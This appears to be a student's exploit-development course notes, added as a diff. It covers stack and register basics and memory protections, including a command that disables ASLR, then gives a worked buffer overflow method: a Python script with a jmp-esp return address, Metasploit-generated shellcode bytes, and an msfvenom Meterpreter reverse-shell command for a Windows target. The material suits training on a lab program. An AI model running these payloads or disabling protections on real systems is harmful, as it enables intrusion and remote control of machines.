@@ -1,0 +1,267 @@
+
+** every function file has a main function
+
+
+===========EXPLOIT DEVELOPMENT===========
+
+Heap – memory that can be allocated and deallocated as needed.
+
+Stack – a contiguous section of memory used for passing arguments to other functions and general housekeeping.
+
+Registers – Storage elements as close as possible to the central processing unit (CPU). There are many uses and types of registers, but in simple terms, general purpose registers can be used for whatever function is desired, that is fetching the contents of something from memory and placing it in the register for some computation/comparison, or special purpose registers such as the Instruction Pointer (IP), or Stack Pointer (SP) which are discussed below.
+
+Instruction Pointer (IP) – (AKA Program Counter (PC) contains the address of next instruction to be executed. When the instruction is executed, it increments to the next instruction unless the instruction transfers control to another location by replacing the contents of the IP with the address of the next command to be executed through the process of jumping, calling, or returning.
+
+Stack Pointer (SP) – Contains the address of the next available space on the stack. The x86 architecture utilizes a top-down stack. When an item is saved on the stack (using a push command), it will be placed in the location addressed by the SP, after which, the SP will be decremented. When an item is fetched from the stack (using a pop instruction), the SP is decremented and then the item is retrieved from the address pointed to by the SP.
+
+Base Pointer (BP) – The base of the stack. Used to ensure that items placed on the stack can be referenced using an offset relative to the BP. Because each function is provided a portion of the stack, it can be used to ensure that the function does not address items outside the bounds of their area on the stack. When there is nothing on the stack the BP will equal SP.
+
+Function - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient. Functions can be written within the program or can exist outside of the main program through the processing of linking (accessing code outside the main program). When a function allocates space for variables, those variables are placed on the stack, so when the function completes and returns back to the calling function, access to those.
+
+Shellcode – The code that is executed once an exploit successfully takes advantage of a vulnerability. Shellcode often provides a shell to the actor, but it doesn’t have to. Whatever the intended effect is, is written in the shellcode.
+
+
+----------------------------------------------------------------------------------------------
+
+Binary Exploitation
+	Common types of memory exploits
+
+		Heap Overflow
+
+		Buffer Overflow
+
+==============================================================================================
+
+Binary Defenses
+
+Non executable (NX) stack
+
+For this buffer overflow example to work requires that the shellcode be placed on the stack. There should never be executable code on the stack, so marking the allocated memory for the stack as non-executable is prudent. Typically, by default, the compiler ensures that the code is compiled to prevent execution of code on the stack. If your desire is to override this behavior, for example to create code to demonstrate a buffer overflow, then, on Linux, pass the execstack option to the linker. This can be done by using -z execstack in gcc.
+
+
+
+Address Space Layout Randomization (ASLR)
+
+ASLR is a mechanism that pseudo-randomizes the memory addresses of the stack, running processes and shared objects in memory. Addresses are subject to change each time the program is executed and since the buffer overflow example above relies predicting the value of the IP, implementing ASLR will reduce the reliability of the buffer overflow exploit so that is is very likely that it will fail.
+
+Unlike other protections that part of the executable and are implemented at compile time, ASLR is a function of the kernel and it can be viewed or manipulated by this pseudo file in proc:
+
+/proc/sys/kernel/randomize_va_space
+
+	0 – No randomization, everything is static
+	1 – Conservative randomization
+	2 – Full randomization 
+		You can view its current value by using cat to display its contents:
+		cat /proc/sys/kernel/randomize_va_space
+
+
+		You can set its value by using echo and redirection to overwrite its previous 			contents:
+		echo 0 > /proc/sys/kernel/randomize_va_space
+
+
+
+Data Execution Prevention (DEP)
+
+Data is data, and not code and should never execute. The stack is designed to hold data. Code should never execute within the region allocated for the stack. The stack is meant to maintain the contents of variables, registers, etc. and perform general housekeeping for the program. The stack should never be used to place or execute code. The -z noexecstack option with gcc passes this option to the linker which marks the area of memory occupied by the stack as non-executable and an attempt to change the IP to that area will result in a segmentation fault.
+
+
+
+Stack Canaries
+
+When performing a buffer overflow, you are writing over areas of the stack that has been allocated and . The gcc option -fstack-protector, enabled by default on modern distributions, adds extra code which interleaves values within stack without affecting the items on the stack so if any of these interleaved items are overwritten, the program will halt and you will see a stack smashing error. Stack Canaries create these interleaved values at run-time so they change each time the program is executed which adds to the complexity of subverting them.
+
+
+
+Position Independent Executable (PIE)
+
+PIE code pseudo-randomizes all sections of the code to maximize protections against buffer overflows.
+
+PIE is set by compiling the program with using the -fPIE option. Many modern Linux distributions set this by default, but it can be forced by using the option -no-pie.
+
+
+
+
+steps for buffer overflow
+
+
+gdb <func>
+disass main (see if it's vulnerable to buffer overflow in this case it was "gets")
+most common vulnerable functions - printf, sprintf, strcat, strcpy, and gets
+	copy and paste pattern from wiremask into script in buffer variable
+	run <<< $(script_name.py)
+	- get the eip value and paste it in wiremask
+	- edit the script to where the string is one character * <offset>
+	run script again 
+		get the EIP
+		
+
+env - gdb fun(name of program)
+show env
+unset env LINES
+unset env COLUMNS
+show env
+run
+<enter bunch of a's>
+info proc map
+	first address after heap to the bottom
+		find /b <0xf7de1000> , <0xffffe000>, 0xff, 0xe4
+			(start addr)	(end addr)
+			
+copy like five or 6 of them 
+
+ex.
+
+0xf7de3b59
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+0xf7f64aff
+
+	then go back into script
+	
+common out the eip and set a new one, you need to reverse it when you set a new one
+
+ex.
+
+original eip = "0xf7f645fb"
+
+new eip = "\xfb\x45\xf6\xf7"
+
+next load shellcode
+
+	msfconsole
+		use payload/linux/x86/exec
+		show options
+		set CMD whoami
+		show options
+		generate -b "\x00" -f python
+			copy buf lines at bottom
+		paste into script and add "+ buf" to the print statement
+		
+	then run sudo ./func <<< $(python lin_buf.py)
+		(name of program)  (script)
+
+=========================================DAY 2================================================
+
+
+run program, then open immunity debugger and attach program, then run script, then play in immunity debugger
+
+get the eip
+then go in script and make a new buf line <buf += "A" *2003>
+
+
+
+!mona jmp -r esp -m "essfunc.dll"
+
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.149 lport=4444 -b "\x00" -f python
+shell code command
+
+
+===============================================================================================
+
+Methodology:
+
+<program> = func
+>gdb program
+>disass main         - disassemble main function
+  find more functions and disassemble those
+>run                 - runs the program
+  input alot of characters to overflow
+      Starting program: /home/student/func 
+      Enter a string: 
+      AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+      Program received signal SIGSEGV, Segmentation fault.
+
+in a script:
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+####################################################################################################333
+buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+eip = "BBBB"
+
+nop = '\x90' *  5
+
+print(buffer + eip + nop)
+######################################################################################################
+
+>gdb program
+>run <<< $(python3 lin_buff.py)
+
+grab the EIP Register value: EIP: 0x31634130 ('0Ac1')     #0x31634130
+put it into wiremask; gives you the offset/length of the buffer you need to overflow
+change the buffer in the script to "A" * <offset size>
+###########################################################################################################
+#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+buffer = "A" * 62
+###########################################################################################################
+run
+EIP should be 0x42424242 ('BBBB')
+
+>env - gdb func
+>show env
+>unset env LINES
+>unset env COLUMNS
+>run     #not from gdb peda
+over flow again
+>info proc map
+get the mem address from the first after heap to the last one in the stack
+>find /b 0xf7de1000(first) , 0xffffe000(last), 0xff, 0xe4
+copy 6 of the addresses
+
+modify script
+############################################################
+#eip = "BBBB"
+eip = "\xfb\x45\xf6\xf7"      #one of the address but reverse the pairs
+#0xf7de3b59
+#0xf7f588ab
+#0xf7f645fb
+#0xf7f6460f
+#0xf7f64aeb
+#0xf7f64aff
+############################################################
+
+>msfconsole
+>use payload/linux/x86/exec
+>show options
+>set CMD whoami
+>generate -b "\x00" -f python
+
+modify script:
+#############################################################
+#eip = "BBBB"
+eip = "\xfb\x45\xf6\xf7"
+#0xf7de3b59
+#0xf7f588ab
+#0xf7f645fb
+#0xf7f6460f
+#0xf7f64aeb
+#0xf7f64aff
+
+buf =  b""
+buf += b"\xbb\xd2\x2c\x29\x54\xdb\xca\xd9\x74\x24\xf4\x5a"
+buf += b"\x2b\xc9\xb1\x0b\x83\xc2\x04\x31\x5a\x10\x03\x5a"
+buf += b"\x10\x30\xd9\x43\x5f\xec\xbb\xc6\x39\x64\x91\x85"
+buf += b"\x4c\x93\x81\x66\x3c\x33\x52\x11\xed\xa1\x3b\x8f"
+buf += b"\x78\xc6\xee\xa7\x7c\x08\x0f\x38\xf4\x60\x60\x59"
+buf += b"\x97\x19\x7e\xce\x34\x50\x9f\x3d\x3a"
+
+nop = '\x90' *  5
+
+print(buffer + eip + nop + buf)
+#############################################################
+
+run the exploit:
+>sudo ./func <<< $(python lin_buff.py)
+
+
+
+
+
+
+
+
+
+
+
